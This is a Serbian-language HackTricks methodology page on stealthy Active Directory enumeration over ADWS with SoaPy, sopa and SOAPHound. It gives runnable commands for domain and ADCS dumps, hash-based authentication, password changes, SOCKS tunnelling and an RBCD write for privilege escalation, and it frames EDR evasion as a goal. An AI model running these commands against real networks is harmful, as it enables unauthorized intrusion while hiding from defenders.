# Enumerisanje Active Directory Web Services (ADWS) i prikriveno prikupljanje podataka

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **podrazumevano omogućen na svakom Domain Controller-u od Windows Server 2008 R2** i osluškuje na TCP portu **9389**. Uprkos nazivu, **ne koristi se HTTP**. Umesto toga, servis izlaže podatke u LDAP stilu kroz niz vlasničkih .NET protokola za uokviravanje:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran u ovim binarnim SOAP okvirima i prolazi kroz neuobičajen port, **mnogo je manja verovatnoća da će enumerisanje preko ADWS-a biti nadgledano, filtrirano ili prepoznato po potpisu nego klasičan LDAP/389 i 636 saobraćaj**. Za operatere to znači:<sup>[[1]](#references)[[7]](#references)</sup>

* Prikrivenije izviđanje – Blue team-ovi se često usredsređuju na LDAP upite.
* Mogućnost prikupljanja podataka sa **hostova koji ne koriste Windows (Linux, macOS)** tunelovanjem 9389/TCP kroz SOCKS proxy.
* Isti podaci koje biste dobili preko LDAP-a (korisnici, grupe, ACL-ovi, schema itd.), uz mogućnost **upisa** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

Interakcije sa ADWS-om implementirane su preko WS-Enumeration-a: svaki upit počinje porukom `Enumerate`, koja definiše LDAP filter/atribute i vraća GUID `EnumerationContext`, a zatim sledi jedna ili više poruka `Pull` koje prenose rezultate u količinama do veličine prozora koju definiše server.<sup>[[7]](#references)</sup> Konteksti ističu nakon približno 30 minuta, pa alati moraju da razdvajaju rezultate na stranice ili podele filtere (upiti po prefiksu za svaki CN) da ne bi izgubili stanje.<sup>[[8]](#references)</sup> Pri zahtevanju security descriptor-a, navedite kontrolu `LDAP_SERVER_SD_FLAGS_OID` kako biste izostavili SACL-ove; u suprotnom ADWS jednostavno izostavlja atribut `nTSecurityDescriptor` iz SOAP odgovora.

> NAPOMENA: ADWS koriste i mnogi RSAT GUI/PowerShell alati, pa se saobraćaj može stopiti sa legitimnom administratorskom aktivnošću.

## SoaPy – izvorni Python klijent

[SoaPy](https://github.com/logangoins/soapy) je **potpuna ponovna implementacija ADWS protokolskog steka u čistom Python-u**. Formira NBFX/NBFSE/NNS/NMF okvire bajt po bajt, što omogućava prikupljanje podataka sa Unix-sličnih sistema bez korišćenja .NET runtime-a.<sup>[[1]](#references)[[2]](#references)</sup>

### Ključne funkcije

* Podržava **proxy saobraćaj kroz SOCKS** (korisno za C2 implant-e).
* Precizni filteri pretrage, identični LDAP upitu `-q '(objectClass=user)'`.
* Opcione operacije **upisa** (`--set` / `--delete`).
* **BOFHound režim izlaza** za direktan unos u BloodHound.<sup>[[3]](#references)</sup>
* Oznaka `--parse` za formatiranje vremenskih oznaka / `userAccountControl` vrednosti radi lakšeg čitanja.<sup>[[2]](#references)</sup>

### Ciljane oznake za prikupljanje podataka i operacije upisa

SoaPy sadrži odabrane prekidače koji preslikavaju najčešće LDAP zadatke za lov na ADWS-u: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, kao i opcije `--query` / `--filter` za prilagođeno preuzimanje podataka. Uparite ih sa primitivama za upis, kao što su `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (priprema SPN-a za ciljano Kerberoasting) i `--asrep` (menja `DONT_REQ_PREAUTH` u `userAccountControl`).<sup>[[2]](#references)</sup>

Primer ciljane SPN pretrage koja vraća samo `samAccountName` i `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Koristite isti host/iste akreditive da odmah iskoristite pronađene ranjivosti: izlistajte objekte koji podržavaju RBCD pomoću `--rbcds`, a zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` da pripremite lanac Resource-Based Constrained Delegation (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) za kompletan postupak zloupotrebe).

### Instalacija (host operatera)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump preko ADWS-a (Linux/Windows)

* Fork `ldapdomaindump` alata koji zamenjuje LDAP upite ADWS pozivima preko TCP/9389 kako bi smanjio broj detekcija LDAP potpisa.
* Obavlja početnu proveru dostupnosti porta 9389, osim ako nije prosleđena opcija `--force` (preskače proveru ako su skeniranja portova bučna/filtrirana).
* Testiran je uz Microsoft Defender for Endpoint i CrowdStrike Falcon, uz uspešno zaobilaženje opisano u README-u.<sup>[[4]](#references)</sup>

### Instalacija

```bash
pipx install .
```

### Upotreba

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Tipičan izlaz beleži proveru dostupnosti porta 9389, ADWS bind i početak/završetak dump-a:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Praktičan klijent za ADWS u Golang-u

Slično kao soapy, [sopa](https://github.com/Macmod/sopa) implementira stek ADWS protokola (MS-NNS + MC-NMF + SOAP) u Golang-u i izlaže zastavice komandne linije za slanje ADWS poziva, kao što su:<sup>[[5]](#references)</sup>

* **Pretraga i preuzimanje objekata** - `query` / `get`
* **Životni ciklus objekta** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Uređivanje atributa** - `attr [add|replace|delete]`
* **Upravljanje nalozima** - `set-password` / `change-password`
* i druge, kao što su `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` itd.

### Ključni detalji mapiranja protokola

* Pretrage u LDAP stilu obavljaju se pomoću **WS-Enumeration** (`Enumerate` + `Pull`), uz projekciju atributa, kontrolu opsega (Base/OneLevel/Subtree) i paginaciju.
* Dohvatanje pojedinačnog objekta koristi **WS-Transfer** `Get`; izmene atributa koriste `Put`; brisanja koriste `Delete`.
* Ugrađeno kreiranje objekata koristi **WS-Transfer ResourceFactory**; za objekte po meri koristi se **IMDA AddRequest**, zasnovan na YAML šablonima.
* Operacije sa lozinkama su **MS-ADCAP** akcije (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Neautentifikovano otkrivanje metapodataka (mex)

ADWS izlaže WS-MetadataExchange bez akreditiva, što predstavlja brz način da se proveri izloženost pre autentifikacije:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Beleške o otkrivanju DNS/DC-a i izboru Kerberos cilja

Sopa može da pronađe DC-ove putem SRV zapisa ako je `--dc` izostavljen, a `--domain` naveden. Upite šalje ovim redosledom i koristi cilj sa najvišim prioritetom:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operativno, prednost dajte resolveru kojim upravlja DC da biste izbegli greške u segmentiranim okruženjima:

* Koristite `--dns <DC-IP>` da bi se **sva** SRV/PTR/forward pretraživanja obavljala preko DC DNS-a.
* Koristite `--dns-tcp` kada je UDP blokiran ili su SRV odgovori veliki.
* Ako je Kerberos omogućen, a `--dc` je IP adresa, sopa obavlja **reverse PTR** upit da bi dobio FQDN za ispravno SPN/KDC usmeravanje. Ako se Kerberos ne koristi, PTR upit se ne obavlja.

Primer (IP + Kerberos, prinudno korišćenje DNS-a preko DC-a):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opcije za autentifikacioni materijal

Pored lozinki u čistom tekstu, sopa podržava **NT hashes**, **Kerberos AES keys**, **ccache** i **PKINIT certificates** (PFX ili PEM) za ADWS autentifikaciju. Kerberos se podrazumeva kada se koriste opcije `--aes-key`, `-c` (ccache) ili opcije zasnovane na sertifikatima.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Kreiranje prilagođenih objekata pomoću predložaka

Za proizvoljne klase objekata, komanda `create custom` koristi YAML predložak koji se mapira na IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` i `rdn` definišu kontejner i relativni DN.
* `attributes[].name` podržava `cn` ili namespaced `addata:cn`.
* `attributes[].type` prihvata `string|int|bool|base64|hex` ili eksplicitni `xsd:*`.
* **Nemojte** uključivati `ad:relativeDistinguishedName` ili `ad:container-hierarchy-parent`; sopa ih automatski dodaje.
* Vrednosti `hex` konvertuju se u `xsd:base64Binary`; koristite `value: ""` za postavljanje praznih stringova.

## SOAPHound – ADWS prikupljanje velikog obima (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET collector koji sve LDAP interakcije obavlja unutar ADWS-a i emituje JSON kompatibilan sa BloodHound v4. Jednom izgradi potpunu keš memoriju za `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a zatim je ponovo koristi za prolaze velikog obima `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (DNS integrisan sa AD-om), tako da samo ~35 kritičnih atributa ikada napusti DC. AutoSplit (`--autosplit --threshold <N>`) automatski deli upite prema prefiksu CN-a kako bi ostao ispod isteka EnumerationContext-a od 30 minuta u velikim šumama.<sup>[[8]](#references)</sup>

Uobičajen tok rada na operatorskoj VM mašini pridruženoj domenu:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Izvezeni JSON se direktno uklapa u tokove rada SharpHound/BloodHound — pogledajte [BloodHound methodology](bloodhound.md) za ideje za naknadno prikazivanje grafova. AutoSplit čini SOAPHound otpornim pri radu sa šumama koje sadrže više miliona objekata, uz manji broj upita nego kod snimaka u stilu ADExplorer-a.

## Stealth AD Collection Workflow

Sledeći tok rada pokazuje kako da preko ADWS-a nabrojite **objekte domena i ADCS-a**, konvertujete ih u BloodHound JSON i tražite putanje napada zasnovane na sertifikatima – sve sa Linux-a:

1. **Tunelujte 9389/TCP** sa ciljne mreže do svoje mašine (npr. pomoću Chisel-a, Meterpreter-a, SSH dinamičkog prosleđivanja portova itd.). Izvezite `export HTTPS_PROXY=socks5://127.0.0.1:1080` ili koristite SoaPy-jeve opcije `--proxyHost/--proxyPort`.

2. **Prikupite objekat korenskog domena:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Prikupite objekte povezane sa ADCS-om iz Configuration NC-a:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Konvertujte u BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što je `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da biste otkrili putanje eskalacije preko sertifikata (ESC1, ESC8 itd.).

### Upisivanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za kompletan lanac **Resource-Based Constrained Delegation** (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Sažetak alata

| Namena | Alat | Napomene |
|---------|------|-------|
| ADWS enumeracija | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, čitanje/pisanje |
| ADWS dump velikog obima | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, prvo keš, BH/ADCS/DNS režimi |
| Uvoz u BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konvertuje SoaPy/ldapsearch logove |
| Kompromitovanje sertifikata | [Certipy](https://github.com/ly4k/Certipy) | Može se proslediti kroz isti SOCKS |
| ADWS enumeracija i izmene objekata | [sopa](https://github.com/Macmod/sopa) | Generički klijent za interakciju sa poznatim ADWS endpoint-ima - omogućava enumeraciju, kreiranje objekata, izmene atributa i promenu lozinki |

## References

- [1] [SpecterOps – Obavezno koristite SOAP(y) – vodič za operatere za prikriveno prikupljanje AD podataka pomoću ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – specifikacije MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Prikrivena enumeracija Active Directory okruženja pomoću ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Alat SOAPHound za prikupljanje Active Directory podataka putem ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
